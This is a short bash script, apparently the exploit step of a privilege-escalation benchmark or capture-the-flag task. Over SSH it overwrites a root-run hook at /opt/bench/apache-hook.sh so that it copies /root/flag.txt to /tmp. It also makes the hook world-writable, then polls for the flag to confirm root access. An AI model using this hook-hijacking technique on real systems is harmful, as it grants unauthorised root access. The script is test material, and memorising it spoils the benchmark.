#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/apache_flag
cat > /opt/bench/apache-hook.sh <<'\''EOF'\''
#!/bin/sh
cat /root/flag.txt > /tmp/apache_flag
EOF
chmod 777 /opt/bench/apache-hook.sh
for i in $(seq 1 45); do
  if test -r /tmp/apache_flag && grep -q FLAG /tmp/apache_flag 2>/dev/null; then
    cat /tmp/apache_flag
    exit 0
  fi
  sleep 1
done
exit 1
')"
assert_root_output "${out}"
